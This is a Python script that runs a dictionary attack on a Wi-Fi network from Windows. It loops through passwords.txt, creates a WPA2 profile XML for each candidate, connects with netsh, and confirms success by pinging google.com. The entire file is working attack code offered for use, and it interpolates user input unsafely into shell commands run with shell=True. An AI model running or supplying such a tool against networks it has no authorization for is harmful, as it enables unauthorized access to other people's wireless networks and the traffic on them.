import subprocess
import time
import os

# ======================================================
# Attempts to connect to a Wi-Fi network using netsh
# ======================================================
def connect_to_wifi(ssid, password):
    try:
        # Add the Wi-Fi profile from the temporary XML file
        cmd = 'netsh wlan add profile filename="temp_profile.xml"'
        subprocess.run(cmd, shell=True, capture_output=True, check=True)

        # Attempt to connect using the profile name (SSID)
        cmd = f'netsh wlan connect name="{ssid}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        # Return True if the command executed successfully
        return result.returncode == 0
    except Exception as e:
        # Handle unexpected errors
        print(f"Error during connection: {e}")
        return False


# ======================================================
# Creates a temporary Wi-Fi profile in XML format
# ======================================================
def create_temp_profile(ssid, password):
    # XML structure required by Windows WLAN profiles
    xml_content = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''

    # Write (or overwrite) the temporary XML file
    with open("temp_profile.xml", "w", encoding="utf-8") as f:
        f.write(xml_content)


# ======================================================
# Performs a ping test to check internet connectivity
# ======================================================
def ping_google(timeout=10):
    """
    Pings google.com once and returns True if successful
    """
    try:
        # Windows ping syntax: -n 1 sends one packet
        result = subprocess.run(
            ['ping', '-n', '1', 'google.com'],
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.returncode == 0
    except:
        return False


# ======================================================
# Waits briefly and then checks internet connectivity
# ======================================================
def wait_and_ping():
    # Allow time for the connection to stabilize
    print("Waiting for connection stabilization...")
    time.sleep(5)

    # Verify actual internet access
    print("Checking internet connectivity...")
    return ping_google()


# ======================================================
# Main program logic
# ======================================================
def main():
    # Ask the user for the Wi-Fi network name
    ssid = input("Enter Wi-Fi network name (SSID): ")

    # Determine the directory where the script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))
    password_file = os.path.join(script_dir, "passwords.txt")

    # Check if the password file exists
    if not os.path.exists(password_file):
        print(f"'passwords.txt' not found in:\n{script_dir}")
        return

    # Load passwords from file
    try:
        with open(password_file, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading password file: {e}")
        return

    # Abort if the file is empty
    if not passwords:
        print("No passwords found in the file")
        return

    print(f"\nFound {len(passwords)} passwords for network '{ssid}'")
    print("Starting attempts...")

    last_password = None

    # Iterate over each password
    for i, password in enumerate(passwords, 1):
        print(f"\nAttempt {i}/{len(passwords)}: Trying password '{password}'")
        last_password = password

        # Create a temporary Wi-Fi profile
        create_temp_profile(ssid, password)

        # Attempt connection
        success = connect_to_wifi(ssid, password)

        if success:
            print(f"✅ Connected successfully using password: {password}")

            # Verify actual internet connectivity
            if wait_and_ping():
                print("✅ Internet connection confirmed")
                try:
                    os.remove("temp_profile.xml")
                except:
                    pass
                return
            else:
                print("⚠️ Connected to Wi-Fi but no internet access")
                print("Continuing with next attempt...")
        else:
            print("❌ Connection failed")

        # Clean up temporary profile file
        try:
            os.remove("temp_profile.xml")
        except:
            pass

        # Short delay between attempts
        time.sleep(1)

    # If no password worked
    print("\n❌ No password was successful")

    # Final retry using the last password
    if last_password:
        print(f"\nRetrying last password '{last_password}' with connectivity check...")
        create_temp_profile(ssid, last_password)
        success = connect_to_wifi(ssid, last_password)

        if success:
            print(f"✅ Connected using last password: {last_password}")
            if wait_and_ping():
                print("✅ Internet connection confirmed")
                try:
                    os.remove("temp_profile.xml")
                except:
                    pass
                return
            else:
                print("⚠️ Connected but no internet access")
        else:
            print(f"❌ Connection failed with last password")

        try:
            os.remove("temp_profile.xml")
        except:
            pass


# ======================================================
# Script entry point
# ======================================================
if __name__ == "__main__":
    main()
